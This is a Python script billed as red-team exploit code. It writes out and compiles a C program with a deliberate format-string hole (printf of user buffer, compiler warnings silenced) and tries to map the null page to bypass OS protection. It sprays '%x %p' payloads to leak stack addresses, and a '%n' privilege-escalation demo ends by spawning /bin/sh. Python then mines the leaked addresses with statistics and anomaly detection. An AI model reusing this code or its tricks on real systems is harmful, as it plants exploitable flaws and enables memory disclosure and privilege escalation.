#!/usr/bin/env python3
import subprocess
import time
import os
import signal
import re
import statistics
import argparse
import random
import math  # Needed for computing entropy

# Try importing the machine learning modules. If unavailable, ML analysis will be skipped.
try:
    from sklearn.ensemble import IsolationForest
    import numpy as np
except ImportError:
    IsolationForest = None

def calculate_entropy(address_list: list) -> float:
    """
    Calculates the Shannon entropy of the hex address distribution.
    """
    if not address_list:
        return 0.0
    total = len(address_list)
    frequency = {}
    for addr in address_list:
        frequency[addr] = frequency.get(addr, 0) + 1
    entropy = 0.0
    for count in frequency.values():
        p = count / total
        entropy -= p * math.log2(p)
    return entropy

def analyze_scan_output(output: str) -> str:
    """
    Analyzes the raw scan output from the vulnerable C scanner and produces
    actionable insights. In addition to basic statistics, the analysis now
    includes:
      - Total iterations run.
      - Count and ratio of segmentation fault recoveries.
      - Detailed statistics about allocated buffer sizes.
      - Statistical analysis of leaked hex addresses (including entropy).
      - Identification of highly repeated addresses.
      - Advanced warnings if segfault frequency is high.
      - Heuristic interpretation of each unique memory address.
      - Red Team insights regarding null page mapping and potential OS security bypass.
    """
    insights = []

    # -------------------------------
    # 1. Iteration Count Analysis
    # -------------------------------
    iteration_matches = re.findall(r'Iteration (\d+):', output)
    num_iterations = len(iteration_matches)
    insights.append(f"Total iterations completed: {num_iterations}")

    # -------------------------------
    # 2. Segmentation Fault Analysis
    # -------------------------------
    segfault_matches = re.findall(r'Caught segmentation fault', output)
    num_segfaults = len(segfault_matches)
    insights.append(f"Number of segmentation faults encountered: {num_segfaults}")
    if num_iterations > 0:
        success_iterations = num_iterations - num_segfaults
        segfault_ratio = num_segfaults / num_iterations
        insights.append(f"Successful iterations without segmentation fault: {success_iterations}")
        insights.append(f"Segmentation fault ratio: {segfault_ratio:.2%}")
    else:
        segfault_ratio = 0.0
        insights.append("No iterations detected for segfault ratio calculation.")

    # -------------------------------
    # 3. Memory Allocation Analysis
    # -------------------------------
    allocation_matches = re.findall(r'Allocating (\d+) bytes', output)
    allocation_sizes = [int(x) for x in allocation_matches]
    if allocation_sizes:
        avg_alloc = sum(allocation_sizes) / len(allocation_sizes)
        min_alloc = min(allocation_sizes)
        max_alloc = max(allocation_sizes)
        insights.append(f"Average allocated memory size: {avg_alloc:.2f} bytes")
        insights.append(f"Memory allocation range: {min_alloc} - {max_alloc} bytes")
        if len(allocation_sizes) > 1:
            stdev_alloc = statistics.stdev(allocation_sizes)
            median_alloc = statistics.median(allocation_sizes)
            insights.append(f"Standard deviation of allocated memory sizes: {stdev_alloc:.2f} bytes")
            insights.append(f"Median allocated memory size: {median_alloc} bytes")
        else:
            stdev_alloc = 0.0
            insights.append("Insufficient data for advanced allocation statistics.")
    else:
        avg_alloc = 0.0
        stdev_alloc = 0.0
        insights.append("No allocation size data found.")

    # -------------------------------
    # 4. Hexadecimal Address Analysis
    # -------------------------------
    hex_addresses = re.findall(r'0x[0-9a-fA-F]+', output)
    if hex_addresses:
        addresses_int = [int(addr, 16) for addr in hex_addresses]
        unique_addresses = set(addresses_int)
        insights.append(f"Total hex addresses extracted: {len(hex_addresses)}")
        insights.append(f"Unique hex addresses: {len(unique_addresses)}")
        if len(addresses_int) > 1:
            try:
                avg_addr = statistics.mean(addresses_int)
                std_dev_addr = statistics.stdev(addresses_int)
                median_addr = statistics.median(addresses_int)
                insights.append(f"Average hex address value: 0x{avg_addr:016x}")
                insights.append(f"Median hex address value: 0x{median_addr:016x}")
                insights.append(f"Standard deviation of hex address values: {std_dev_addr:.2f}")
            except Exception as e:
                insights.append("Insufficient data for advanced hex address statistics.")

            # Compute the entropy of the distribution.
            entropy = calculate_entropy(addresses_int)
            insights.append(f"Entropy of hex address distribution: {entropy:.2f}")
        else:
            insights.append("Not enough hex address data to compute statistics.")
    else:
        insights.append("No hex addresses found in the output.")

    # -------------------------------
    # 5. Repetitive Hex Address Detection
    # -------------------------------
    address_frequency = {}
    for addr in hex_addresses:
        address_frequency[addr] = address_frequency.get(addr, 0) + 1
    repeated_addresses = {addr: count for addr, count in address_frequency.items() if count > 10}
    if repeated_addresses:
        insights.append("Alert: The following hex addresses appear very frequently (possibly indicating a stable memory region):")
        for addr, count in repeated_addresses.items():
            insights.append(f"  {addr} appeared {count} times")
    else:
        insights.append("No highly repetitive hex address patterns detected.")

    # -------------------------------
    # 6. Advanced Warning Checks
    # -------------------------------
    if num_iterations > 0 and (num_segfaults / num_iterations) > 0.3:
        insights.append("Warning: High frequency of segmentation faults detected. This may indicate unstable memory operations.")
    else:
        insights.append("Segmentation fault frequency appears within expected limits.")

    # -------------------------------
    # 7. Memory Address Interpretations
    # -------------------------------
    if hex_addresses:
        insights.append("Memory Address Interpretations:")
        unique_hex_addresses = sorted(set(hex_addresses), key=lambda a: int(a, 16))
        for addr in unique_hex_addresses:
            interpretation = interpret_address(int(addr, 16))
            insights.append(f"  {addr} -> {interpretation}")
        if "0x0" in hex_addresses:
            insights.append("Red Team Insight: NULL pointer (0x0) detected. May indicate potential for null pointer dereference exploits.")
    else:
        insights.append("No memory addresses available for interpretation.")

    # -------------------------------
    # 8. Null Page Mapping Check
    # -------------------------------
    if "(DEBUG) Successfully mapped null page" in output:
        insights.append("Red Team Insight: Null page mapping successful. Exploits leveraging null pointer dereference may be feasible.")
    elif "(DEBUG) Null page mapping attempt failed" in output:
        insights.append("Red Team Warning: Null page mapping failed. OS-level protections appear active.")
    else:
        insights.append("Red Team Warning: Null page mapping not detected. OS-level protections appear active.")

    analysis_report = "\n".join(insights)
    return analysis_report

def extract_features(output: str) -> list:
    """
    Extracts a feature vector from the raw scan output.
    The feature vector comprises:
       [segfault_ratio, average allocated bytes, stdev of allocation, hex entropy, unique hex count]
    """
    iteration_matches = re.findall(r'Iteration (\d+):', output)
    num_iterations = len(iteration_matches)
    segfault_matches = re.findall(r'Caught segmentation fault', output)
    num_segfaults = len(segfault_matches)
    segfault_ratio = (num_segfaults / num_iterations) if num_iterations > 0 else 0.0

    allocation_matches = re.findall(r'Allocating (\d+) bytes', output)
    allocation_sizes = [int(x) for x in allocation_matches]
    if allocation_sizes:
        avg_alloc = sum(allocation_sizes) / len(allocation_sizes)
        stdev_alloc = statistics.stdev(allocation_sizes) if len(allocation_sizes) > 1 else 0.0
    else:
        avg_alloc = 0.0
        stdev_alloc = 0.0

    hex_addresses = re.findall(r'0x[0-9a-fA-F]+', output)
    if hex_addresses:
        addresses_int = [int(addr, 16) for addr in hex_addresses]
        unique_addresses = set(addresses_int)
        hex_entropy = calculate_entropy(addresses_int)
        unique_hex_count = len(unique_addresses)
    else:
        hex_entropy = 0.0
        unique_hex_count = 0

    feature_vector = [segfault_ratio, avg_alloc, stdev_alloc, hex_entropy, unique_hex_count]
    return feature_vector

def perform_ml_analysis(feature_vector: list, aggregated_features: list) -> str:
    """
    Performs machine learning based anomaly detection using the aggregated feature vectors
    collected over multiple scan cycles.
    """
    if IsolationForest is None:
        return "Machine Learning Module not available. Skipping ML-based anomaly detection."
    try:
        ml_insights = []
        if len(aggregated_features) >= 10:
            clf = IsolationForest(contamination=0.1, random_state=42)
            clf.fit(aggregated_features)
            prediction = clf.predict([feature_vector])[0]
            if prediction == -1:
                ml_insights.append("Machine Learning Alert: Current scan cycle is anomalous.")
            else:
                ml_insights.append("Machine Learning Analysis: Current scan cycle appears normal.")
            ml_insights.append(f"(DEBUG) Aggregated training samples: {len(aggregated_features)}")
            ml_insights.append(f"(DEBUG) Current feature vector: {feature_vector}")
        else:
            ml_insights.append("Machine Learning Analysis: Not enough data for robust anomaly detection (need at least 10 cycles).")
            ml_insights.append(f"(DEBUG) Aggregated training samples so far: {len(aggregated_features)}")
    except Exception as e:
        ml_insights = [f"Machine Learning Analysis encountered an error: {e}"]
    return "\n".join(ml_insights)

def interpret_address(addr: int) -> str:
    """
    Interprets a memory address using heuristic ranges.
    These heuristics are based on a typical Linux x86_64 layout and may not be accurate on all systems.
    """
    if addr == 0:
        return "NULL pointer"
    if 0x7ff000000000 <= addr <= 0x7fffffffffff:
        return "Likely a stack address"
    if 0x400000 <= addr < 0x800000:
        return "Likely an address in the code (text) segment"
    if 0x100000000 <= addr < 0x7ff000000000:
        return "Likely a heap or global variable address"
    return "Unknown memory region"

def main(mode="scan"):
    """
    Main function that either runs the iterative scanning loop (default mode)
    or executes a privilege escalation demonstration if mode is "priv_escalate".
    """
    # ----------------------------------------------------
    # Embedded C Code with Vulnerabilities and Exploits
    # ----------------------------------------------------
    # The C code implements:
    #   - A vulnerable format string function (`vulnerable_print`) that directly passes
    #     user-controlled input to printf.
    #   - An iterative scanning loop that demonstrates how the stack layout can change.
    #   - An attempt to map the null page (red team technique).
    #   - **New:** A demonstration function (`exploit_privilege_escalation`) that uses a
    #     crafted format string (with "%n") to simulate privilege escalation by modifying
    #     a local variable.
    #
    # WARNING: This code is for authorized red team testing only.
    c_code = r'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>

// Global jump buffer for recovering from segmentation faults
jmp_buf env;

/*
 * Signal handler for SIGSEGV.
 * When a segmentation fault occurs, print a message and jump back.
 */
void handle_sigsegv(int sig) {
    printf("\nCaught segmentation fault (signal %d). Attempting recovery...\n", sig);
    longjmp(env, 1);
}

/*
 * Attempt to map the null page (address 0x0).
 * This is a red team technique to bypass OS-level protections against null pointer dereference.
 */
void map_null_page() {
    void *addr = mmap((void*)0, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (addr == MAP_FAILED) {
        printf("(DEBUG) Null page mapping attempt failed: %s\n", strerror(errno));
    } else {
        printf("(DEBUG) Successfully mapped null page at address 0x0.\n");
    }
}

/*
 * vulnerable_print() performs an insecure printf call.
 * Any format specifiers in the buffer are interpreted, allowing for potential memory
 * disclosure and writes.
 */
#if defined(__GNUC__)
__attribute__((noinline))
#endif
void vulnerable_print(const char *buffer) {
    #if defined(__clang__)
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wformat-security"
    #elif defined(__GNUC__)
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wformat-security"
    #endif

    printf(buffer);
    printf("\n");

    #if defined(__clang__)
    #pragma clang diagnostic pop
    #elif defined(__GNUC__)
    #pragma GCC diagnostic pop
    #endif
}

/*
 * smart_scan() is a wrapper that introduces variation in the stack layout.
 */
void smart_scan(const char *buffer, unsigned long iteration) {
    volatile char dummy[128];
    for (size_t i = 0; i < sizeof(dummy); i++) {
        dummy[i] = (char)((iteration + i) & 0xFF);
    }
    vulnerable_print(buffer);
}

/*
 * exploit_privilege_escalation demonstrates a potential exploitation of the format string vulnerability.
 * It crafts an input that attempts to use the "%n" specifier to write the value 1 into a local variable.
 * If successful, this simulates privilege escalation (e.g. by setting an "is_admin" flag).
 */
void exploit_privilege_escalation() {
    int is_admin = 0;
    printf("Before exploitation, is_admin = %d\n", is_admin);

    char exploit_buffer[128];
    memset(exploit_buffer, 0, sizeof(exploit_buffer));
    // Place the address of is_admin at the very beginning of the buffer.
    memcpy(exploit_buffer, &is_admin, sizeof(is_admin));
    // Craft a payload that prints one character ("A") so that the printed count is 1,
    // then uses the positional conversion specifier "%1$n" to write that count into is_admin.
    const char *payload = "A%1$n";
    size_t payload_len = strlen(payload);
    if (sizeof(exploit_buffer) - sizeof(is_admin) > payload_len) {
        memcpy(exploit_buffer + sizeof(is_admin), payload, payload_len);
    }

    // Call vulnerable_print with the crafted exploit buffer.
    vulnerable_print(exploit_buffer);

    printf("After exploitation, is_admin = %d\n", is_admin);
    if (is_admin == 1) {
        printf("Privilege escalation simulation successful: is_admin set to 1.\n");
        // For demonstration, spawn a shell.
        system("/bin/sh");
    } else {
        printf("Privilege escalation simulation failed.\n");
    }
}

// Define initial parameters for the scanning loop.
#define INITIAL_SIZE   1024         // 1 KB initial allocation
#define STEP_SIZE      (1024*2)     // Increase by 2 KB each iteration

/*
 * Main function.
 * Added support for a command-line flag "--priv-escalate" to trigger the privilege escalation demo.
 */
int main(int argc, char *argv[]) {
    // Set up signal handler for segmentation fault.
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_sigsegv;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        perror("sigaction");
        return EXIT_FAILURE;
    }

    // Attempt to map the null page.
    map_null_page();

    // If the "--priv-escalate" argument is provided, run the privilege escalation demo.
    if (argc > 1 && strcmp(argv[1], "--priv-escalate") == 0) {
        printf("Running privilege escalation demonstration...\n\n");
        exploit_privilege_escalation();
        return EXIT_SUCCESS;
    }

    printf("Starting vulnerable format string test in an infinite loop...\n\n");

    unsigned long iteration = 0;
    size_t current_size = INITIAL_SIZE;

    while (1) {
        if (setjmp(env) != 0) {
            printf("Recovered from segmentation fault. Continuing to next iteration...\n\n");
            iteration++;
            current_size += STEP_SIZE;
            continue;
        }

        printf("Iteration %lu:\n", iteration);
        printf("Allocating %zu bytes\n", current_size);

        char *buffer = (char *)malloc(current_size);
        if (!buffer) {
            fprintf(stderr, "Failed to allocate %zu bytes (iteration %lu): %s\n",
                    current_size, iteration, strerror(errno));
            break;
        }

        // Fill the buffer with a repeated malicious pattern.
        const char *pattern = "%x %p ";
        size_t pattern_len = strlen(pattern);
        for (size_t offset = 0; offset < current_size - 1; offset += pattern_len) {
            size_t remaining = (current_size - 1) - offset;
            size_t to_copy = (remaining < pattern_len) ? remaining : pattern_len;
            memcpy(&buffer[offset], pattern, to_copy);
        }
        buffer[current_size - 1] = '\0';

        printf("Buffer preview (first 50 chars): %.50s\n", buffer);
        printf("Printing buffer (vulnerable):\n");

        smart_scan(buffer, iteration);

        printf("Analysis:\n");
        printf("  - The printed memory values come from the stack frame of 'vulnerable_print()'.\n");
        printf("  - Using 'smart_scan()', a dummy array is allocated to vary the stack layout.\n");
        printf("  - Constant output despite changes may indicate stable stack regions or compiler optimizations.\n");
        printf("--------------------------------------------------\n\n");

        free(buffer);
        iteration++;
        current_size += STEP_SIZE;
    }

    printf("Vulnerable format string test complete.\n");
    return 0;
}
'''

    # ----------------------------------------------------
    # Write the C code to file and compile it.
    # ----------------------------------------------------
    c_filename = "vulnerable_scanner.c"
    with open(c_filename, "w") as f:
        f.write(c_code)

    # Compile the C code with no optimizations (-O0) to help preserve stack differences.
    compile_cmd = ["gcc", "-o", "vulnerable_scanner", c_filename, "-O0", "-Wall", "-Wextra"]
    print("Compiling vulnerable_scanner.c...")
    result = subprocess.run(compile_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print("Compilation failed:")
        print(result.stdout)
        print(result.stderr)
        exit(1)
    else:
        print("Compilation successful.")
        print("(DEBUG) gcc output:", result.stdout, result.stderr)

    # ----------------------------------------------------
    # Depending on the chosen mode, run the appropriate exploit.
    # ----------------------------------------------------
    if mode == "priv_escalate":
        print("\nRunning privilege escalation demonstration (single execution mode)...\n")
        try:
            proc = subprocess.Popen(["./vulnerable_scanner", "--priv-escalate"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            stdout, _ = proc.communicate(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, _ = proc.communicate()
        print(stdout)
        return

    # ----------------------------------------------------
    # Otherwise, start the iterative scanning loop.
    # ----------------------------------------------------
    print("\nStarting iterative scanning loop. Each cycle runs the vulnerable scanner briefly,\nperforms analysis, and updates the machine learning model.\n")
    aggregated_features = []  # Holds feature vectors from each scan cycle
    cycle = 0

    try:
        while True:
            print(f"\n========== Scan Cycle {cycle} ==========")
            proc = subprocess.Popen(["./vulnerable_scanner"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            print(f"(DEBUG) Launched process with PID: {proc.pid}")

            scan_duration = 5
            time.sleep(scan_duration)

            print(f"\nTerminating the vulnerable scanner for cycle {cycle}...")
            try:
                os.kill(proc.pid, signal.SIGTERM)
                print(f"(DEBUG) Sent SIGTERM to PID: {proc.pid}")
            except ProcessLookupError:
                print(f"(DEBUG) Process {proc.pid} already terminated.")

            try:
                stdout, _ = proc.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                print("(DEBUG) Process did not terminate in time, sending SIGKILL...")
                try:
                    os.kill(proc.pid, signal.SIGKILL)
                    stdout, _ = proc.communicate(timeout=3)
                except Exception as e:
                    print(f"(DEBUG) Error during forced termination: {e}")
                    stdout = ""

            print(f"\nCycle {cycle} raw scanner output:")
            print("-------------------------------------")
            print(stdout)
            print("-------------------------------------")

            analysis_report = analyze_scan_output(stdout)
            print("Cycle Analysis Report:")
            print(analysis_report)

            feature_vector = extract_features(stdout)
            print(f"\nExtracted Feature Vector for cycle {cycle}: {feature_vector}")

            aggregated_features.append(feature_vector)
            ml_report = perform_ml_analysis(feature_vector, aggregated_features)
            print("\nMachine Learning Analysis Report:")
            print(ml_report)

            if len(aggregated_features) >= 2:
                tolerance = 1e-6
                differences = [abs(x - y) for x, y in zip(aggregated_features[-1], aggregated_features[-2])]
                if all(d < tolerance for d in differences):
                    print("No improvement detected: consecutive cycles are identical. Quitting scan loop.")
                    break

            print("============================================\n")
            cycle += 1
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Scan loop interrupted by user. Exiting gracefully...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Machine Learning Red Team Exploit Code")
    parser.add_argument("--exploit", action="store_true", help="Execute exploit code in scanning loop mode.")
    parser.add_argument("--priv-escalate", action="store_true", help="Run privilege escalation demonstration mode.")
    args = parser.parse_args()

    if args.priv_escalate:
        main(mode="priv_escalate")
    elif args.exploit:
        main(mode="scan")
    else:
        print("No exploit mode selected. Use '--exploit' for scanning or '--priv-escalate' for privilege escalation demonstration.")